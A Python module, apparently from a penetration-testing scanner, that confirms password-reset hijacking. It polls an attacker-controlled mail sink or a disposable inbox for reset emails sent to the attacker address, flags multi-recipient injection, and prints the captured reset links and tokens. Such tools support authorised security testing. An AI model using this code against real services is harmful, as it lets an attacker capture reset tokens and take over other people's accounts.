#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True

import re
from utils.style import Colors, spinner
from utils.utils import requests, EMAIL_REGEX
from utils import live
from modules.token_analysis import _analyze_token


_ADDR_RE = re.compile(r'([A-Za-z0-9._%+\-]+)@([A-Za-z0-9.\-]+)')


def _norm_local(local):
    """Strip sub-addressing tag: 'attacker+tag' → 'attacker'."""
    return local.split("+", 1)[0].lower()


def _mail_hits_attacker(entry, attacker_email):
    """
    True if the captured mail was delivered to the attacker address.
    Checks the SMTP envelope (rcpt_tos = who really got it) first, then To/Cc/From.
    Sub-addressing (attacker+anything@dom) counts as a hit.
    """
    m = _ADDR_RE.search(attacker_email or "")
    if not m:
        return False
    a_local, a_dom = _norm_local(m.group(1)), m.group(2).lower()

    candidates = list(entry.get("rcpt_tos") or [])
    for field in ("to", "cc", "from"):
        if entry.get(field):
            candidates.append(entry[field])

    for cand in candidates:
        for cm in _ADDR_RE.finditer(str(cand)):
            if cm.group(2).lower() == a_dom and _norm_local(cm.group(1)) == a_local:
                return True
    return False


def _victim_from_body(body):
    m = re.search(EMAIL_REGEX, body or "", re.IGNORECASE)
    return m.group(0) if m else None


def mail_analysis(url, parsed_req, baseline, interact, email, proxy=None, mail_wait=30, mailbox=None):
    """
    OOB confirmation of password-reset hijack.

    Two interchangeable sources (both yield the same message shape):
      • SMTP sink  — polls the interact server's /api/mail (needs -i + your domain).
      • disposable — polls a mail.tm inbox provisioned at startup (needs no infra;
                     `mailbox` is a DisposableInbox and its address IS the attacker -e).

    On a hit the reset link/token is extracted and analyzed.
    """
    print(f"{Colors.CYAN} ├ Mail analysis (OOB reset capture){Colors.RESET}")

    proxies = {"http": proxy, "https": proxy} if proxy else None
    victim = _victim_from_body(parsed_req.get("body"))

    # --- pick the mail source ---
    if mailbox is not None:
        email = mailbox.address
        source_desc = f"disposable inbox {email}"

        def fetch():
            return mailbox.messages()
    else:
        if not interact:
            print(f"  {Colors.YELLOW}[!] -i/--interact required (SMTP sink) or use --disposable-mail — skipped{Colors.RESET}")
            return
        if not email or "@" not in email:
            print(f"  {Colors.YELLOW}[!] -e/--email (attacker address) required, or use --disposable-mail — skipped{Colors.RESET}")
            return
        mail_api = interact.rstrip("/") + "/api/mail"
        source_desc = mail_api

        def fetch():
            try:
                r = requests.get(
                    mail_api, timeout=10, verify=False, proxies=proxies,
                    headers={"Accept": "application/json"},
                )
                return r.json() if r.status_code == 200 else []
            except Exception:
                return []

    POLL_INTERVAL = 5     # email delivery is asynchronous — poll until mail_wait elapses
    attempts = max(1, int(mail_wait) // POLL_INTERVAL)
    print(f"{Colors.CYAN} └─ Polling {source_desc} for mail to {email} (up to {mail_wait}s){Colors.RESET}")

    hijacked = []
    for i in range(attempts):
        live.testing(f"mail poll {i + 1}/{attempts}")
        mails = fetch()
        hijacked = [m for m in mails if _mail_hits_attacker(m, email)]
        if hijacked:
            break
        if i < attempts - 1:
            spinner(POLL_INTERVAL, message="        Waiting for reset email...")

    live.clear()

    if not hijacked:
        print(f"{Colors.GREEN}   └── [-] No reset email delivered to attacker address{Colors.RESET}")
        if mailbox is not None:
            print(f"{Colors.CYAN}   └── [i] Check later in your browser: {mailbox.webmail_url} "
                  f"(login: {mailbox.address} / {mailbox.password}){Colors.RESET}")
        else:
            print(f"{Colors.CYAN}   └── [i] Mail may take longer — re-run or check the dashboard /api/mail{Colors.RESET}")
        return

    for m in hijacked:
        rcpts = ", ".join(m.get("rcpt_tos") or [])
        multi = victim and any(victim.lower() in str(r).lower() for r in (m.get("rcpt_tos") or []))
        print(f"{Colors.RED}   └── [CRITICAL] Reset email delivered to attacker → account takeover confirmed{Colors.RESET}")
        print(f"{Colors.RED}       from: {m.get('mail_from')} | rcpt: {rcpts}{Colors.RESET}")
        print(f"{Colors.RED}       subject: {m.get('subject')!r}{Colors.RESET}")
        if multi:
            print(f"{Colors.RED}       victim + attacker both in envelope → CC/BCC / multi-recipient injection{Colors.RESET}")

        for link in (m.get("links") or [])[:5]:
            print(f"{Colors.YELLOW}       reset link: {link}{Colors.RESET}")

        tokens = m.get("tokens") or []
        if not tokens:
            print(f"{Colors.YELLOW}       [!] No token pattern found in mail body — inspect manually{Colors.RESET}")
        for token in tokens:
            print(f"{Colors.MAGENTA}       token: {token}{Colors.RESET}")
            findings = _analyze_token(token, email=victim)
            for severity, desc in findings:
                color = Colors.RED if severity in ("CRITICAL", "HIGH") else (
                    Colors.YELLOW if severity == "MEDIUM" else Colors.CYAN)
                print(f"{color}         [{severity}] {desc}{Colors.RESET}")
